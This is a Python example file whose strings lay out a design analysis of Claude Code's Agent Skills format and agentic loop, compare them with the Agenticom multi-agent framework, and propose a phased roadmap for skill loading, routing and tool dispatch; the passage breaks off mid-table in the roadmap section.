"""
Exploration 02: Claude Code Skills & Agentic Workflows — Principles, Design, Practices
=======================================================================================

A deep analysis of how Claude Code handles agentic workflows and skills, and how
Agenticom can implement something similar — or better.

Sources consulted:
  - agentskills.io/specification  (official Agent Skills open standard)
  - platform.claude.com/docs/en/agents-and-tools/agent-skills/overview
  - code.claude.com/docs/en/skills  (Claude Code-specific)
  - code.claude.com/docs/en/subagents
  - anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills
  - jannesklaas.github.io/ai/2025/07/20/claude-code-agent-design.html
  - simonwillison.net/2025/Oct/16/claude-skills/
  + Full codebase analysis of Agenticom's agent/tools/workflow/self_improvement modules

Usage:
  python examples/exploration_02_claude_code_skills_principles.py
"""

from __future__ import annotations

BOX_W = 72


def box(title: str) -> str:
    bar = "═" * BOX_W
    return f"\n{bar}\n  {title}\n{bar}"


def section(title: str) -> str:
    return "\n" + "─" * BOX_W + f"\n  {title}\n" + "─" * BOX_W


def row(label: str, value: str, w: int = 30) -> str:
    return f"  {label:<{w}}{value}"


def table(headers: list[str], rows: list[list[str]], col_w: int = 22) -> str:
    sep = "─" * (col_w * len(headers) + 2)
    header = "  " + "".join(f"{h:<{col_w}}" for h in headers)
    lines = [header, "  " + sep]
    for r in rows:
        lines.append("  " + "".join(f"{c:<{col_w}}" for c in r))
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
#  PART A  Claude Code's exact skill architecture
# ─────────────────────────────────────────────────────────────────────────────

PART_A = f"""
{box("PART A  —  Claude Code's Skill Architecture (canonical design)")}

{section("A1. Agent Skills — the open standard (agentskills.io)")}

  Agent Skills is an OPEN STANDARD, not a Claude-only feature.
  It works across Claude Code, GitHub Copilot, VS Code Copilot, OpenCode,
  and any agent that implements the spec.

  A skill is a DIRECTORY containing at minimum one file:

    skill-name/
    ├── SKILL.md          ← required: frontmatter + instructions
    ├── scripts/          ← optional: executable code (Python, Bash, JS)
    ├── references/       ← optional: REFERENCE.md, FORMS.md, domain docs
    └── assets/           ← optional: templates, schemas, static data

{section("A2. SKILL.md format — the complete spec")}

  ┌─ Frontmatter (YAML between --- markers) ─────────────────────────────────┐
  │                                                                           │
  │  ---                                                                      │
  │  name: pdf-processing          # required, max 64 chars, kebab-case       │
  │  description: "..."            # required, max 1024 chars                 │
  │  license: Apache-2.0           # optional                                 │
  │  compatibility: "..."          # optional, max 500 chars                  │
  │  metadata:                     # optional, arbitrary key-value            │
  │    author: my-org                                                         │
  │    version: "1.0"                                                         │
  │  allowed-tools: Bash(git:*) Read   # optional, experimental              │
  │  ---                                                                      │
  │                                                                           │
  │  name field constraints:                                                  │
  │    • lowercase letters, numbers, hyphens only                             │
  │    • must NOT start/end with hyphen                                       │
  │    • must NOT contain consecutive hyphens (--)                            │
  │    • must NOT contain reserved words: "anthropic", "claude"               │
  │    • must match the parent directory name exactly                         │
  │                                                                           │
  │  description field purpose:                                               │
  │    • describes BOTH what it does AND when to use it                       │
  │    • this is what Claude reads at startup to decide relevance             │
  │    • include domain keywords for better semantic matching                 │
  └───────────────────────────────────────────────────────────────────────────┘

  ┌─ Body (Markdown, free-form) ──────────────────────────────────────────────┐
  │  No format restrictions. Recommended sections:                            │
  │    ## Overview                                                            │
  │    ## When to Use / Do Not Use When                                       │
  │    ## Step-by-Step Instructions                                           │
  │    ## Examples                                                            │
  │    ## Safety / Security notes                                             │
  │                                                                           │
  │  Keep SKILL.md under 500 lines (< 5,000 tokens).                         │
  │  Move detailed material to references/ files (loaded on demand).          │
  └───────────────────────────────────────────────────────────────────────────┘

{section("A3. The three-level progressive disclosure model")}

  This is the FOUNDATIONAL design principle of Agent Skills.
  Information loads in stages — only when needed.

  ┌──────────┬──────────────┬────────────────┬──────────────────────────────┐
  │  Level   │  When Loaded │  Token Cost    │  Content                     │
  ├──────────┼──────────────┼────────────────┼──────────────────────────────┤
  │  1       │  At startup  │  ~100/skill    │  name + description only     │
  │  (meta)  │  always      │  (very cheap)  │  goes into system prompt     │
  ├──────────┼──────────────┼────────────────┼──────────────────────────────┤
  │  2       │  When skill  │  < 5,000 tok   │  Full SKILL.md body:         │
  │  (instr) │  is triggered│  per skill     │  instructions, steps, etc.   │
  ├──────────┼──────────────┼────────────────┼──────────────────────────────┤
  │  3       │  As needed   │  Effectively   │  scripts/, references/,      │
  │  (resrc) │  by agent    │  zero (scripts │  assets/ — only output of    │
  │          │              │  run via bash) │  scripts enters context      │
  └──────────┴──────────────┴────────────────┴──────────────────────────────┘

  KEY INSIGHT: Level 1 metadata goes into the SYSTEM PROMPT at startup.
               Level 2 is loaded by Claude using bash: cat skill/SKILL.md
               Level 3 scripts are EXECUTED via bash; only output enters context.

  The skill body and scripts NEVER pre-load into the system prompt.
  Claude makes the decision whether to load them based on Level 1 metadata.

{section("A4. How skill invocation works end-to-end")}

  Step 1: Startup
    Claude reads .claude/skills/ directory (or ~/.claude/skills/)
    Loads ALL skill frontmatter into system prompt:
      "Available skills: [pdf-processing: Extract text from PDFs...]"
    Cost: ~100 tokens per skill regardless of skill size.

  Step 2: User sends a task
    User: "Extract the tables from this PDF report"

  Step 3: Claude decides relevance (semantic matching)
    Claude compares task to skill descriptions in system prompt.
    If match → Claude invokes skill (by reading SKILL.md via bash tool).
    This decision is NON-DETERMINISTIC — Claude uses judgment.
    (In Claude Code 2.1+: skills also appear as explicit /slash commands)

  Step 4: Skill content enters context
    Claude executes: Bash("cat .claude/skills/pdf-processing/SKILL.md")
    The SKILL.md body is returned as a tool result → enters context window.
    This is the ONLY time the skill content becomes part of the context.

  Step 5: Agent uses skill knowledge
    Claude now has the skill instructions in context.
    If skill references other files, Claude reads them via bash as needed.
    If skill has scripts/, Claude executes them via bash; only output is kept.

  Step 6: Task completed with enriched knowledge

  CRITICAL DESIGN CHOICE: Skills are NOT system prompt injections.
  The system prompt only has 100-token metadata summaries.
  The actual skill knowledge loads lazily, on-demand, per task.

{section("A5. Subagents vs Skills — the key distinction")}

  Both use the SKILL.md format, but serve different purposes:

  ┌─────────────────────┬──────────────────────┬──────────────────────────┐
  │  Dimension          │  SKILLS              │  SUBAGENTS               │
  ├─────────────────────┼──────────────────────┼──────────────────────────┤
  │  Context            │  Main conversation   │  Own isolated window     │
  │  Invocation         │  Semantic (Claude    │  Explicit (Task tool     │
  │                     │  decides by itself)  │  in code/prompt)         │
  │  Parallelism        │  No                  │  Yes (background mode)   │
  │  Can spawn subagents│  No                  │  No (cannot nest)        │
  │  Context isolation  │  No                  │  Yes                     │
  │  Best for           │  Domain knowledge    │  Long/parallel/isolated  │
  │                     │  + short workflows   │  tasks                   │
  │  SKILL.md extras    │  (standard fields)   │  + tools, model, hooks   │
  └─────────────────────┴──────────────────────┴──────────────────────────┘

  Subagent SKILL.md extra frontmatter fields:
    tools: Read, Grep, Glob, Bash      # which tools the subagent can use
    model: inherit                     # which LLM (haiku | sonnet | opus)
    hooks:                             # PreToolUse hooks for validation
      PreToolUse:
        - matcher: "Bash"
          hooks: [{{type: command, command: ./validate.sh}}]
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART B  Claude Code's agentic workflow design
# ─────────────────────────────────────────────────────────────────────────────

PART_B = f"""
{box("PART B  —  Claude Code's Agentic Workflow Design")}

{section("B1. The core agentic loop")}

  Claude Code is NOT a complex multi-module system.
  Its power comes from a SINGLE while-loop with a focused toolkit.

  Agentic loop (4 phases, repeating):
  ┌────────────────────────────────────────────────────────────────────────┐
  │  1. GATHER CONTEXT   → file reads, searches, bash queries             │
  │  2. TAKE ACTION      → edit files, run code, call MCPs               │
  │  3. VERIFY WORK      → linting, tests, diff checks, LLM judgment     │
  │  4. ITERATE          → repeat until stopping condition met           │
  └────────────────────────────────────────────────────────────────────────┘

  Stopping condition: Model stops calling tools (not an explicit signal).

  Tool inventory — deliberately minimal, only 14 tools:
    Command execution (4):  Bash, Task, TaskOutput, TaskStop
    File operations  (6):  Read, Write, Edit, Glob, Grep, NotebookEdit
    Web interaction  (2):  WebFetch, WebSearch
    Workflow control (2):  AskUserQuestion, ExitPlanMode

  Design principle: FOCUSED TOOLKIT over comprehensive coverage.
  Fewer tools = simpler reasoning = fewer mistakes.

{section("B2. Context management patterns")}

  PATTERN 1: TODO lists as planning anchors
    Claude creates a TODO list at the start of complex tasks.
    Updates it throughout. This serves as:
      (a) Internal planning documentation
      (b) UX feedback for the user
      (c) State recovery if context compacts
    The tool result itself reminds Claude: "keep using the TODO list"
    → instructions embedded in tool results, not just system prompt.

  PATTERN 2: System reminders for continuity
    Periodic system reminders re-orient the agent during long sessions
    spanning hundreds of steps. Dynamically generated to reflect
    current task state, not a static system prompt.

  PATTERN 3: Subagent dispatching for context isolation
    Claude spawns subagents via the Task tool for:
      (a) Operations that produce verbose output (test suites, logs)
      (b) Parallel independent investigations
      (c) Tasks that would exhaust the main context window
    Each subagent has its own fresh context window.
    Subagent results → only summary returns to main conversation.

  PATTERN 4: Auto-compaction
    When approaching ~95% of context window → compaction triggers
    Previous conversation is summarized → only summary kept
    Subagent transcripts stored separately at ~/.claude/projects/.../subagents/

{section("B3. The 'prepare vs execute' distinction")}

  SKILLS PREPARE agents; they don't execute for them.

  Traditional tool (MCP/function call):
    Agent says: "call web_search('query')"
    → Runtime executes the actual search
    → Results returned to agent

  Skill (Claude Code model):
    Agent reads: cat .claude/skills/web-research/SKILL.md
    → Instructions enter context: "when doing web research, always..."
    → Agent now KNOWS how to do web research better
    → Agent executes the research itself using bash/WebFetch tools

  Key difference:
    Tools EXECUTE operations.
    Skills IMPROVE HOW the agent executes with its existing tools.

  Quote (Anthropic engineering blog):
    "Skills prepare Claude to solve a problem, rather than solving it directly.
     They're about discovery and determinism."

{section("B4. Design principles behind skill-as-markdown")}

  WHY MARKDOWN AND NOT CODE:

  1. LLM-native: "Throw in some text and let the model figure it out."
     LLMs are trained on text — they interpret instructions better
     than they navigate API specifications.

  2. Low barrier to contribution:
     Anyone who can write a how-to guide can write a skill.
     No programming required. Community-friendly.

  3. Portable across agents:
     The same SKILL.md works in Claude Code, Copilot, VS Code, OpenCode.
     An open standard (agentskills.io) ensures cross-platform portability.

  4. No token upfront:
     The file exists on the filesystem. It costs 0 tokens unless read.
     A project can have 100 skills installed; only the relevant ones load.

  5. Composable:
     Skills can reference each other via relative paths.
     A skill can mention: "See [advanced guide](references/REFERENCE.md)"
     and Claude reads that file on demand if needed.

  6. Scripts as reliable automation:
     A skill can bundle Python/Bash scripts in scripts/.
     Claude runs them; only the OUTPUT enters context (not the script code).
     This gives deterministic behavior without consuming context budget.

{section("B5. Limitations and gaps in Claude Code's design")}

  1. Semantic invocation is non-deterministic
     Claude decides which skills to use based on description matching.
     There is no guarantee the right skill is used for the right task.
     You cannot FORCE a skill to activate (before v2.1).
     You cannot PREVENT a skill from activating.

  2. No performance feedback loop
     When a skill improves output quality, Claude Code doesn't know.
     There is NO mechanism to track which skills helped.
     Skills cannot be promoted or demoted based on results.

  3. Skills are static — they don't evolve
     Skills are written once by humans. They cannot self-improve
     based on actual usage patterns or failure modes.

  4. Context budget is fixed at ~2% of window (~16,000 chars)
     Skill metadata budget is shared across all installed skills.
     Many skills → less description space per skill.

  5. No per-step or per-agent scoping
     Skills are conversation-level. Every agent in the conversation
     sees the same skill metadata. There's no "developer agent gets
     coding skills, verifier gets security skills" scoping.

  6. Subagents cannot spawn subagents
     Nested delegation is impossible within a single Claude Code session.
     This limits the depth of autonomous multi-agent architectures.

  7. Full context isolation has a cost
     Subagents know nothing about the main conversation state.
     All context must be passed explicitly as text to the subagent.
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART C  Agenticom vs Claude Code — architectural comparison
# ─────────────────────────────────────────────────────────────────────────────

PART_C = f"""
{box("PART C  —  Agenticom vs Claude Code: Architectural Comparison")}

{section("C1. Execution model differences")}

  CLAUDE CODE:
    Single agent, single context, while-loop until done.
    Agent has TOOL ACCESS during execution (bash, file ops, web).
    Skills load on-demand during execution via bash.
    Flow: User → Claude → [tool calls in a loop] → Done

  AGENTICOM:
    Multi-agent team, step-by-step sequential execution (Ralph Loop).
    Each agent produces ONE text output per step. NO tool access.
    Context is explicit: persona + task + parent_outputs only.
    Flow: User → Team.run() → [step1 → step2 → ... → stepN] → Done

  STRUCTURAL DIFFERENCE:
    Claude Code: one agent, many tool calls, single context
    Agenticom:   many agents, one LLM call per step, isolated contexts

{section("C2. Agenticom's execution pipeline (from codebase analysis)")}

  Team.run(task)
    ↓
  for step in self.steps:                              # sequential
    agent = self.agents[step.agent_role]
    input_data = template.format(**outputs)            # {{{{task}}}}, {{{{step_outputs.X}}}}
    context = AgentContext(parent_outputs=outputs)     # fresh every step (Ralph Loop)
    result = await agent.execute(input_data, context)
    outputs[step.id] = result.output                   # accumulate
    ↓
  LLMAgent._execute_task(task, context):
    full_prompt = system_prompt                        # persona + role label
    full_prompt += "\\nTask: " + task
    if context.workspace: full_prompt += workspace_context
    if context.parent_outputs: full_prompt += parent_context
    return await self._executor(full_prompt, context)  # ONE LLM call → text
    ↓
  UnifiedExecutor → OpenClawExecutor (Anthropic API)

  What agents CAN see:    persona, task, parent step outputs
  What agents CANNOT do:  call tools, read files, execute code mid-step

{section("C3. Current skills/tools gap in Agenticom")}

  AgentConfig.tools field:
    declared:  tools: list[str] = field(default_factory=list)
    used in:   WorkflowParser reads it → passes to agent constructor
    executed:  NOWHERE — tools are stored but never dispatched

  MCPToolBridge:
    exists:    orchestration/tools/mcp_bridge.py (861 lines)
    status:    fully implemented, not wired into LLMAgent._execute_task()
    comment:   "TODO: Parse result for tool calls" (line ~810)

  MCPRegistry:
    exists:    orchestration/tools/registry.py
    maps:      ~25 tool categories → MCP server names
    status:    working lookup, not wired into execution pipeline

  CONCLUSION: Agenticom has the plumbing (AgentConfig.tools,
              MCPToolBridge, MCPRegistry) but the pipes are not
              connected. This is the primary gap vs Claude Code.

{section("C4. What Agenticom does BETTER than Claude Code today")}

  STRENGTH 1: Deterministic multi-agent orchestration
    Agenticom's Ralph Loop gives EXPLICIT data flow between agents.
    Each step knows exactly what previous steps produced.
    No hallucination of prior context — it's injected as text.
    Claude Code: single agent must remember everything in context.

  STRENGTH 2: SMARC scoring — empirical performance measurement
    After every run, SMARC scores each agent on 5 dimensions:
      Specific, Measurable, Actionable, Realistic, Compoundable
    Claude Code: no objective per-run quality measurement.

  STRENGTH 3: Self-improving prompt evolution (PromptEvolver)
    When SMARC gap detected → PromptEvolver generates a persona patch.
    Patches stored in PromptVersionStore, versioned, rollback-able.
    Claude Code: no mechanism for skills or prompts to evolve.

  STRENGTH 4: Workflow-scoped configuration
    Each YAML workflow defines its own agents, roles, retry policies.
    Skills can be declared per-agent per-workflow.
    Claude Code: skills are project-level, not workflow-level.

  STRENGTH 5: 13 bundled workflow templates
    feature-dev, security-assessment, due-diligence, etc.
    Each workflow can have its own curated skill set.
    Claude Code: user must assemble their own skill stack.
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART D  Where Agenticom can do it BETTER
# ─────────────────────────────────────────────────────────────────────────────

PART_D = f"""
{box("PART D  —  Where Agenticom Can Do It Better")}

{section("D1. BETTER: Evidence-based skill selection (vs semantic guessing)")}

  CLAUDE CODE MODEL:
    Claude reads skill descriptions at startup.
    Claude decides which skill to use based on semantic similarity.
    Non-deterministic. May use the wrong skill. No feedback on correctness.

  AGENTICOM MODEL (proposed):
    SMARC dimension scores identify EXACTLY which capability is failing.
    Example: developer_output_specificity = 0.28 (LOW, 3 consecutive runs)
    ImprovementLoop maps this gap to a specific skill category.
    SkillGapMatcher: "low specificity for developer in a TypeScript task"
                     → inject typescript-react-patterns skill
    Evidence-based, not a guess. Attribution tracked in RunRecord.

  WHY BETTER:
    • Activates skills when NEEDED, not when semantically nearby
    • Token cost justified by empirical evidence, not intuition
    • Skills that don't improve SMARC can be rolled back automatically

{section("D2. BETTER: Per-step, per-agent skill scoping")}

  CLAUDE CODE MODEL:
    Skills are CONVERSATION-LEVEL. Every agent in the conversation
    sees the same 100-token metadata for every skill.
    No way to say "the developer agent gets TypeScript skills
    but the verifier agent gets security skills".

  AGENTICOM MODEL (proposed):
    Each WorkflowStep is executed by a specific agent with a specific role.
    Skills are declared per-agent in the YAML:
      agents:
        - id: developer
          skills: [typescript-react-patterns, async-python-patterns]
        - id: verifier
          skills: [lint-and-validate, owasp-top10]
    WorkflowParser injects the right skill content into the right persona.
    Tester gets test skills. Reviewer gets review skills. Precisely targeted.

  WHY BETTER:
    • Zero wasted tokens on irrelevant skills per agent
    • Cleaner separation of concerns (each agent is a true specialist)
    • Auditable: the YAML shows exactly which agent gets which skills

{section("D3. BETTER: Skill evolution (vs static markdown)")}

  CLAUDE CODE MODEL:
    Skills are static markdown files. Humans write them, humans update them.
    No feedback mechanism from agent performance back to skill content.

  AGENTICOM MODEL (proposed):
    PromptEvolver currently generates heuristic patches like:
      "CRITICAL: Be more specific in your output."
    Instead, it can use SKILL CONTENT as patch material:
      Gap: developer_output_specificity LOW for TypeScript tasks
      → SkillGapMatcher finds: typescript-react-patterns
      → SkillLoader.load(skill, section="Step-by-Step", max_tokens=400)
      → PromptEvolver._skill_propose(): extract the specificity-relevant section
      → Inject into persona as a permanent version-controlled patch
    Next run: SMARC scores the new persona. If improved → keep.
    If NOT improved → rollback, try next candidate skill.

  WHY BETTER:
    • Skills improve based on actual workflow failure patterns
    • Human-curated skills bootstrap; SMARC data refines them
    • Full rollback capability (PromptVersionStore)
    • Attribution: RunRecord records which skill patch was active

{section("D4. BETTER: Skill attribution and feedback loop")}

  CLAUDE CODE MODEL:
    No mechanism to know if a skill helped.
    No cross-run correlation between skill presence and output quality.

  AGENTICOM MODEL (proposed):
    RunRecord metadata field: active_skills: {{agent_id: [skill_names]}}
    After N runs with skill active:
      if smarc_composite(with_skill) > smarc_composite(without_skill) + 0.10:
        skill is effective → promote (keep in persona version chain)
        log: "skill owasp-top10 lifted verifier specificity 0.41→0.79"
      else:
        skill is not effective → try next candidate or LLM rewrite
    CLI: agenticom feedback skill-report <workflow-id>
         → shows: which skills active, gap addressed, SMARC before/after

  WHY BETTER:
    • Closes the loop: skills are measured, not assumed effective
    • Skills compete — only the ones that work survive in the persona chain
    • Creates a virtuous flywheel: better skills → higher SMARC → fewer patches

{section("D5. BETTER: Deterministic activation (vs semantic guessing)")}

  CLAUDE CODE MODEL:
    Before v2.1: Claude decides whether to use a skill — non-deterministic.
    After v2.1: Skills also appear as /slash-commands for explicit invocation.
    Neither mode gives the workflow author guaranteed activation.

  AGENTICOM MODEL (proposed):
    THREE tiers with different activation guarantees:
      TIER 1 [ALWAYS-ON]: Declared in YAML → injected at parse time → guaranteed
      TIER 2 [KEYWORD]:   SkillRouter checks task keywords at run time
      TIER 3 [SMARC]:     ImprovementLoop injects based on gap evidence
    No guessing. The YAML author has full control.
    TIER 1 is deterministic by construction — no LLM involvement in activation.

  WHY BETTER:
    • Reproducible runs: same YAML → same skills → same behavior
    • Auditable: log shows exactly which skills were active per step
    • Testable: write test that asserts skill X was active for agent Y

{section("D6. BETTER: Deep integration with the self-improvement flywheel")}

  CLAUDE CODE MODEL:
    Skills + workflows + agent behavior: three separate concerns.
    No system ties them together for continuous improvement.

  AGENTICOM MODEL:
    All four layers are integrated:

    LAYER 1  Workflow YAML       defines which skills each agent gets (static)
             │
    LAYER 2  SkillRouter         selects additional skills based on task keywords
             │
    LAYER 3  ImprovementLoop     detects SMARC gaps → selects skills as patch material
             │
    LAYER 4  PromptVersionStore  persists skill-enriched personas, versioned, rollback-able
             │
    LAYER 5  RunRecorder         attributes SMARC improvements to specific skills
             │
    LAYER 6  FeedbackCLI         operator reviews, approves, or rejects skill patches

    Each layer feeds the next. The flywheel:
      Run → SMARC score → gap → skill selection → patch → next run → SMARC ↑
      → skill confirmed → promoted → next gap → repeat
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART E  Agenticom Skill Design Blueprint
# ─────────────────────────────────────────────────────────────────────────────

PART_E = f"""
{box("PART E  —  Agenticom Skill Design Blueprint")}

{section("E1. Format: compatible with agentskills.io open standard")}

  Agenticom skills should be FULLY COMPATIBLE with the Agent Skills spec.
  This gives access to the 868+ community skills from antigravity-awesome-skills
  and any other agentskills.io-compatible skill library.

  Minimum required:
    skills/skill-name/SKILL.md
    ├── ---
    ├── name: skill-name
    ├── description: "What it does and when to use it"
    └── ---
    └── [body with instructions]

  Agenticom-specific extensions (backward compatible):
    Agenticom uses a YAML field in the workflow definition, not in SKILL.md:

    agents:
      - id: developer
        skills:
          - typescript-react-patterns   # always-on
          - async-python-patterns       # always-on
        conditional_skills:             # NEW: Agenticom extension
          - skill: owasp-top10
            when: "security or auth in task"
          - skill: postgres-best-practices
            when: "database or sql in task"
        smarc_skills:                   # NEW: gap-triggered skills
          - skill: lint-and-validate
            trigger: output_specificity < 0.5

{section("E2. Progressive disclosure in Agenticom (without a VM)")}

  Claude Code has filesystem + bash access for lazy skill loading.
  Agenticom agents have NO filesystem access during step execution.
  We must simulate progressive disclosure differently.

  AGENTICOM PROGRESSIVE DISCLOSURE MODEL:
  ┌──────────────────────────────────────────────────────────────────────┐
  │  Level 1 (metadata):   stored in skills/skill-name/SKILL.md         │
  │    Used by: SkillRouter for keyword matching                        │
  │    Token cost in persona: 0 (skill metadata not added to persona)   │
  │    Alternative: skill_index.json built at install time              │
  │                                                                      │
  │  Level 2 (instructions): SKILL.md body                             │
  │    Injected into: agent.persona at WorkflowParser parse time        │
  │    Token cost: capped at max_tokens per skill (recommend: 400)      │
  │    Sections extracted: "## Step-by-Step" + "## When to Use"         │
  │                                                                      │
  │  Level 3 (resources): skills/skill-name/scripts/*.py                │
  │    Used via: WorkflowStep.execute field (shell command after step)  │
  │    Example: execute: "python .agent/skills/pdf/scripts/extract.py"  │
  │    Token cost: 0 (only stdout enters the next step's context)       │
  └──────────────────────────────────────────────────────────────────────┘

  HOW THIS WORKS without a VM:
    The WorkflowStep already has an `execute` field for shell commands.
    Skill scripts can be exposed as step-level shell commands.
    The script output becomes the step's execution_output artifact.
    The next step's agent can see this in its context.

{section("E3. Three activation paths (implementation design)")}

  PATH 1 — Static YAML injection (Tier 1, ALWAYS-ON)
  ─────────────────────────────────────────────────
  Where: WorkflowParser._parse_agent() — +8 lines
  When:  At workflow parse time (once, zero per-run overhead)
  How:
    if "skills" in agent_data:
        for skill_name in agent_data["skills"]:
            skill_text = skill_loader.load(skill_name, max_tokens=400)
            if skill_text:
                agent_config.persona += f"\\n\\n## Skill: {{skill_name}}\\n{{skill_text}}"

  PATH 2 — Task-time routing (Tier 2, CONDITIONAL)
  ─────────────────────────────────────────────────
  Where: AgentTeam.run() — before first step
  When:  Once per team.run(task) call (< 5ms, no LLM call)
  How:
    for agent in self.agents.values():
        new_persona = agent.base_persona  # stored separately from patched persona
        selected = skill_router.select(task, agent.role, max_skills=2)
        for skill in selected:
            new_persona += skill_loader.load(skill, max_tokens=400)
        agent.update_persona(new_persona, version_id="task-time")

  PATH 3 — SMARC-driven patch (Tier 3, LOOP-DRIVEN)
  ─────────────────────────────────────────────────
  Where: ImprovementLoop._on_pattern_trigger() — enhanced
  When:  Every N runs when SMARC gap detected (async background task)
  How:
    gap = "developer_output_specificity"     # e.g., score 0.28
    skill = skill_gap_matcher.find(gap, agent_role="developer", task=task)
    if skill:
        skill_content = skill_loader.load(skill, section="steps", max_tokens=600)
        patch = prompt_evolver._skill_propose(persona, skill_content, gap)
        prompt_version_store.save_patch(patch)
    else:
        patch = prompt_evolver._heuristic_propose(...)  # existing fallback

{section("E4. SkillLoader — the core primitive (30 lines)")}

  class SkillLoader:
      def __init__(self, skills_dirs: list[Path]):
          self.skills_dirs = skills_dirs    # search in order

      def load(
          self,
          skill_name: str,
          sections: list[str] | None = None,   # None = full body
          max_tokens: int = 400,
      ) -> str:
          # 1. Find skill directory
          path = self._find_skill(skill_name)
          if not path: return ""

          # 2. Read and strip frontmatter
          text = path.read_text(encoding="utf-8")
          body = re.sub(r"^---.*?---\\n", "", text, flags=re.DOTALL)

          # 3. Strip "ask the user" clauses (unsafe in autonomous mode)
          body = re.sub(r"[Aa]sk the (?:user|client).*?\\n", "", body)

          # 4. Extract specific sections if requested
          if sections:
              body = self._extract_sections(body, sections)

          # 5. Cap by token budget (approx: 1 token ≈ 0.75 words)
          words = body.split()
          return " ".join(words[: int(max_tokens * 0.75)])

      def _find_skill(self, name: str) -> Path | None:
          for d in self.skills_dirs:
              p = d / name / "SKILL.md"
              if p.exists(): return p
          return None

  Search order:
    1. .agent/skills/          (project-local, highest priority)
    2. ~/.claude/skills/       (user-global, same as Claude Code)
    3. agenticom/bundled_skills/ (framework defaults)

{section("E5. skill_index.json — the discovery mechanism")}

  Built at install time (not runtime):
  {{
    "typescript-react-patterns": {{
      "description": "Expert patterns for React/TypeScript...",
      "keywords": ["react", "tsx", "hooks", "component", "jsx", "next.js"],
      "roles":    ["developer"],
      "tier":     "conditional",
      "max_tokens": 400,
      "source":   "antigravity-awesome-skills"
    }},
    "owasp-top10": {{
      "description": "OWASP Top 10 security verification checklist",
      "keywords": ["security", "auth", "injection", "xss", "token"],
      "roles":    ["verifier", "reviewer"],
      "tier":     "conditional",
      "smarc_triggers": ["output_specificity < 0.5", "output_actionability < 0.5"]
    }}
  }}

  Built by: scripts/build_skill_index.py
    → scans all SKILL.md files
    → extracts name, description, infers keywords
    → writes skill_index.json
    → can be re-run when new skills are installed
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART F  Implementation roadmap
# ─────────────────────────────────────────────────────────────────────────────

PART_F = f"""
{box("PART F  —  Implementation Roadmap")}

{section("F1. Phase 1: Static skill injection (1-2 hours)")}

  Files to create:
    orchestration/tools/skill_loader.py     30 lines   SkillLoader class

  Files to modify:
    orchestration/workflows/parser.py       +8 lines   inject at _parse_agent()
    agenticom/bundled_workflows/*.yaml      add skills: lists per agent
    orchestration/agents/base.py            +3 lines   store base_persona separately

  YAML workflow change:
    agents:
      - id: developer
        skills:
          - typescript-react-patterns
          - async-python-patterns

  Test:
    python examples/case_study_01_feature_dev_self_improvement.py
    Before: developer SMARC composite ≈ 0.65
    After:  developer SMARC composite ≈ 0.78  (expected +0.13)

  Prerequisite:
    git clone https://github.com/sickn33/antigravity-awesome-skills .agent/skills
    # or: npx antigravity-awesome-skills --path .agent/skills

{section("F2. Phase 2: Task-time skill routing (1 day)")}

  Files to create:
    orchestration/tools/skill_router.py     50 lines   SkillRouter class
    scripts/build_skill_index.py            40 lines   Builds skill_index.json

  Files to modify:
    orchestration/agents/team.py            +5 lines   in run() before step loop
    orchestration/self_improvement/         +1 field   active_skills in RunRecord

  SkillRouter.select(task, agent_role, max_skills=2) -> list[str]:
    Load skill_index.json
    Score each skill: keyword_hits * 2 + role_match
    Return top-K with score > threshold

  Result: Task "Build a Next.js login with Postgres" →
    developer agent automatically gets:
      typescript-react-patterns (score=5: hits next.js, react)
      postgres-best-practices   (score=3: hits postgres)
    WITHOUT any YAML change

{section("F3. Phase 3: SMARC-driven skill injection (2 days)")}

  Files to create:
    orchestration/tools/skill_gap_matcher.py  80 lines  gap → skill mapping
    orchestration/self_improvement/           +30 lines  _skill_propose() in evolver

  Files to modify:
    orchestration/self_improvement/
      improvement_loop.py                     +10 lines  try skill before heuristic
      prompt_evolver.py                       +30 lines  _skill_propose() method
    agenticom/cli.py                          +30 lines  skill-report subcommand

  Gap → skill mapping table (core of SkillGapMatcher):
  ┌──────────────────────────────────┬──────────────────────────────────────┐
  │  SMARC Gap                       │  Skill(s) to inject                  │
  ├──────────────────────────────────┼──────────────────────────────────────┤
  │  *_output_specificity < 0.5      │  lint-and-validate (any role)        │
  │  developer_output_specificity    │  typescript-react-patterns (if TS)   │
  │                                  │  async-python-patterns (if Python)   │
  │  developer_output_measurability  │  postgres-best-practices (if DB)     │
  │  verifier_output_actionability   │  owasp-top10 (security tasks)        │
  │  verifier_output_measurability   │  agent-evaluation (AI components)    │
  │  tester_knowledge_compoundability│  property-based-testing section      │
  │  reviewer_knowledge_compoundability│ observability-review section       │
  └──────────────────────────────────┴──────────────────────────────────────┘

  New CLI command:
    agenticom feedback skill-report feature-dev
    → table: agent | skill_injected | gap_addressed | smarc_before | smarc_after | kept?

{section("F4. Phase 4: Tool dispatch (2-3 days, largest change)")}

  This is the most impactful change: wiring MCPToolBridge into execution.

  Files to modify:
    orchestration/agents/base.py     LLMAgent._execute_task() — parse tool calls in output
    orchestration/tools/mcp_bridge.py  complete the TODO: Parse result for tool calls
    orchestration/agents/team.py    _execute_step() — multi-turn tool loop

  New execution model:
    LLMAgent._execute_task(task, context):
      full_prompt = build_prompt(task, context)

      # NEW: Add tool declarations to prompt
      if self.config.tools:
          tool_decls = mcp_bridge.get_tool_declarations(self.config.tools)
          full_prompt += f"\\n\\nAVAILABLE TOOLS:\\n{{tool_decls}}"
          full_prompt += "\\nTo use a tool, output: <tool>name</tool><input>...</input>"

      max_tool_rounds = 5
      for _ in range(max_tool_rounds):
          response = await self._executor(full_prompt, context)

          # NEW: Check for tool call in response
          tool_call = parse_tool_call(response)
          if not tool_call:
              return response  # Final answer (no tool call)

          # Execute tool
          tool_result = await mcp_bridge.execute(tool_call.name, tool_call.input)

          # Feed result back
          full_prompt += f"\\nAssistant: {{response}}\\nTool result: {{tool_result}}\\nUser: Continue."

      return response  # Final answer after max rounds

  When Phase 4 is done:
    Agents can actually USE tools, not just declare them.
    The developer agent can call web_search to look up a library.
    The verifier agent can run a linting tool to check code.
    Skills + tool access = fully capable specialist agents.

{section("F5. Effort summary and expected outcomes")}

  ┌──────────┬──────────────┬──────────────────┬─────────────────────────┐
  │  Phase   │  Effort      │  Files Touched   │  Expected SMARC Lift    │
  ├──────────┼──────────────┼──────────────────┼─────────────────────────┤
